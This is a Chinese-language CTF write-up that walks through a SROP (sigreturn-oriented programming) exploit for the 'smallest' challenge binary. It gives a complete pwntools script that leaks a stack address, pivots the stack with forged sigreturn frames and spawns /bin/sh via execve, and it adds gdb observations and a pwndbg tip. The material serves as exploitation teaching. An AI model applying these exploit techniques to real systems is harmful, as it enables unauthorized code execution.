    ## set rax=15 and call sigreturn
    sigreturn = p64(syscall_ret) + 'b' * 7
    sh.send(sigreturn)
    raw_input()
    ## call execv("/bin/sh",0,0)
    sigframe = SigreturnFrame()
    sigframe.rax = constants.SYS_execve
    sigframe.rdi = stack_addr + 0x120  # "/bin/sh" 's addr
    sigframe.rsi = 0x0
    sigframe.rdx = 0x0
    sigframe.rsp = stack_addr
    sigframe.rip = syscall_ret
    frame_payload = p64(start_addr) + 'b' * 8 + str(sigframe)
    print len(frame_payload)
    payload = frame_payload + (0x120 - len(frame_payload)) * '\x00' + '/bin/sh\x00'
    sh.send(payload)
    raw_input()
    sh.send(sigreturn)
    sh.interactive()
首先说，我在这段利用代码里放了很多raw_input()，就是为了在每次send一段字符串进去后，停住，看看内存当前是什么状态，读者在执行的时候，记得把所有raw_input()，以及最上面的gdb.attach(sh)代码注释掉，才不会卡住。
第一段
    from pwn import *
    from LibcSearcher import *
    small = ELF('./smallest')
    if args['REMOTE']:
     sh = remote('127.0.0.1', 7777)
    else:
     sh = process('./smallest')
    context.arch = 'amd64'
    context.log_level = 'debug'
    syscall_ret = 0x00000000004000BE
    start_addr = 0x00000000004000B0
例行公事的代码不说了，syscall_ret这个gadget刚好在0x4000BE的位置，start_addr指的是0x4000B0程序的起始位置，每次跳到这里，就会再次执行一遍read操作。具体对应地址，参考下图
接下来一段代码
    gdb.attach(sh)
    payload = p64(start_addr) * 3
    sh.send(payload)
    raw_input()
一上来就传入3个start_addr地址到栈顶上，原exp上没有过多解释，很容易让人上来摸不到头脑，我详细跟一下这个过程，这里gdb.attach一定要放在send之前，不然看不到三个start_addr出现在栈顶，有可能只能看到两个。
如上图看到，左侧发送了三个start_addr(0x4000b0)过去，此时我们看到rsp的值为0x7ffc1b477860，该地址即为当前栈顶地址，其存储内容为发来的第一个0x4000b0，因为是64位程序，我们将rsp值依次加8看看是不是三个0x4000b0：
可见，栈顶是连续的三个0x4000b0，没问题。我们看看程序执行到哪里了
可见，read的syscall已执行完毕，三个0x4000b0已send到栈顶，接下来要执行ret指令，将rsp当前所指的内容弹给rip，即程序跳到0x4000b0程序开始的位置再执行一次read函数。另外，请注意这个ret执行完后，栈顶已还剩两个0x4000b0。
可见栈上确实还剩两个0x4000b0，然后程序也回到了0x4000b0位置继续执行一次read函数。
然后我们看下一段利用代码
    ## modify the return addr to start_addr+3
    ## so that skip the xor rax,rax; then the rax=1
    ## get stack addr
    sh.send('\xb3')
    raw_input()
send了一个字节”\xb3″过去，这是什么意思呢？这段代码利用非常巧妙，让read读一个字节，从而rax作为read的返回值为1，这个1也是write的系统调用号，send的一个字节”\xb3″只覆盖栈顶的第一个0x4000b0的最低位字节，成为0x4000b3（注意是小端序，所以是从最低位字节开始覆盖），这样在本次read结束后，在执行ret指令前，栈顶长这样：
此时，再执行ret指令，rip返回到的位置就是0x4000b3，从而跳过了0x4000b0地址处 xor
rax,rax的指令，避免了rax置零，依旧维持read一个字节后的返回值1。所以，后续如果想让rax为0，就跳回0x4000b0，想让rax为其他值就跳到0x4000b3，避免rax置零。
现在我们执行这个ret指令，来到syscall指令处：
此时执行的syscall指令就是对write函数的系统调用了，会将rsp即栈顶处的内容打出0x400个字节来，我们先不执行，看看现在栈上长什么样：
然后执行这个syscall指令，看看我们接收到了什么：
确实接收到了0x400个字节，并且我们比对一下上面两个图，确实显示write出了栈顶的“第三个”0x4000b0（第一个0x4000b用于再次执行read，第二个覆盖为0x4000b3执行write，第三个也就是这个被write出来了）。第二个8字节也和栈顶的第二个8字节一样，是栈空间的一个地址0x7ffc1b477ef7，这样我们就泄露出了栈空间的一个地址，我们就准备在这里构造伪sigFrame了。
再往下代码：
    stack_addr = u64(sh.recv()[8:16])
    raw_input()
    log.success('leak stack addr :' + hex(stack_addr))
    raw_input()
可以看到，我们取栈顶第二个8字节的内容（本次执行值为0x7ffc1b477ef7）作为stack_addr，在这里构建伪sigFrame。
再往下：
    ## make the rsp point to stack_addr
    ## the frame is read(0,stack_addr,0x400)
    sigframe = SigreturnFrame()
    sigframe.rax = constants.SYS_read
    sigframe.rdi = 0
    sigframe.rsi = stack_addr
    sigframe.rdx = 0x400
    sigframe.rsp = stack_addr
    sigframe.rip = syscall_ret
    payload = p64(start_addr) + 'a' * 8 + str(sigframe)
    sh.send(payload)
    raw_input()
想说，此时栈顶还有最后一个0x4000b0，刚刚write函数执行完毕，此时即将执行ret指令，再次执行一遍read函数，接收新的输入，覆盖到栈顶，这个内容是什么呢？就是上面这段代码“p64(start_addr)
+ ‘a’ * 8 +
str(sigframe)”，先是start_addr，然后8个“a”占位，然后是一个伪sigFrame。这段payload打进来后，栈顶就又是0x4000b0了，这次read结束，执行后面ret指令前的样子如下：
可见0x4000b0、“aaaaaaaa”还有伪sigFrame都进来了。此时执行ret指令，会再次回到程序第一行汇编，再再执行read：
此时又要开始read了，我们传点什么进去呢？请看下面代码
    ## set rax=15 and call sigreturn
    sigreturn = p64(syscall_ret) + 'b' * 7
    sh.send(sigreturn)
    raw_input()
传了p64(syscall_ret) + ‘b’ * 7进去，先分分析，p64(syscall_ret)
占领了当前栈顶的“aaaaaaaa”位置，7个’b’占领了栈顶第二个8字节的最低7个字节，一共send了15(0xf)个字节，根据上面的图也知道栈顶第二个8字节最高位的一个字节为\x00，所以此时栈顶结构如下：
此时再执行当前的ret指令，便会执行syscall_ret这个“syscall;ret”gadget，而恰恰此时rsp会指向我们上次read时传入的伪sigFrame头部，虽然其前7个字节被覆盖成了’bbbbbbb’，不过没有丝毫影响。另外，值得注意的是，因为read函数读了0xf个字节进来，所以此时rax如图为0xf，这个刚好是sigreturn的系统调用号，所以此时执行syscall_ret
gadget会触发sigreturn对rsp当前所指的伪sigFrame的恢复流程。如下图：
回顾上上个代码，可以知道我们伪造的sigFrame是用来再次恢复成read函数的，区别是rsi指向了泄露的栈地址，rip是’syscall;ret’
gadget，从而再下次传入伪sigFrame就会写到泄露的栈地址位置，这此执行得到的这个栈地址值为0x7ffc1b477ef7。
所以，触发完这个sigreturn syscall之后，会直接恢复成read系统调用，如下图：
这个read我们传点什么进来呢？请看下面代码
    ## call execv("/bin/sh",0,0)
    sigframe = SigreturnFrame()
    sigframe.rax = constants.SYS_execve
    sigframe.rdi = stack_addr + 0x120  # "/bin/sh" 's addr
    sigframe.rsi = 0x0
    sigframe.rdx = 0x0
    sigframe.rsp = stack_addr
    sigframe.rip = syscall_ret
    frame_payload = p64(start_addr) + 'b' * 8 + str(sigframe)
    print len(frame_payload)
    payload = frame_payload + (0x120 - len(frame_payload)) * '\x00' + '/bin/sh\x00'
    sh.send(payload)
    raw_input()
注意到这，栈顶位置已经是0x7ffc1b477ef7了。
我们首先还是将传入了start_addr（0x4000b0）用于再再再次触发read，用于接收我们即将要发送的最后一段payload，然后是8个”b”用于占位，然后就是我们伪造的execve伪sigFrame了，最后就是在相对0x7ffc1b477ef7处0x120偏移处传入’/bin/sh\x00’。结构如下图：
OK，布局完毕，执行这个ret，再次回到0x4000b0，执行read函数。
老复读机了，这个read我们传点什么进来呢？请看下面代码（最后一段了）
    sh.send(sigreturn) 
    sh.interactive()
故技重施，将sigreturn的gadget传到新的栈顶：
此时再执行ret指令，便会触发syscall，因为rax值为15，那么这个系统调用为sigreturn，便会恢复我们在新的栈顶构造的execve
sigFrame，从而最终getshell：
经过千难万险，我们总算getshell了，最后的最后我总结一下这道题的思路：
1\. 首先打三个重启程序read流程的gadget进来
2\. 第一个read gadget用于接收对第二个read gadget的覆盖，从而将第二个read gadget覆盖成write gadget
3\. 利用变为write的gadget打印出栈上某地址
4\. 触发第三个read gadget，读入一个用于恢复成read sigFrame，其目的是用于将栈顶迁移至刚刚泄露的栈地址处
5\. 传入sigreturn gadget，用于触发刚刚传入的read sigFrame，从而在新的栈顶开始read
6\. 在新的栈顶传入read gadget和execve sigFrame，此时执行完成会再次开启read
7\. 传入sigreturn gadget，用于恢复execve sigFrame，从而getshell
感谢各位读者读到这里，感谢所有参考链接中的各位作者让我明晰SROP攻击。
最后额外补充一点小技巧：
pwndbg总会把内存一样的地址省略号忽略掉，类似如下：
但这个很影响我们看到具体内存的内容，总是需要脑补，怎么办呢？
我找到了pwndbg的源码，读者可在.gdbinit中看到相应的地址，然后在command/文件夹的telescope.py中，可以看到“ Collapse
repeating values”字样，于是找到111行将“if not skip”改为“if skip”，此时就能完整展现内存样貌而不省略显示了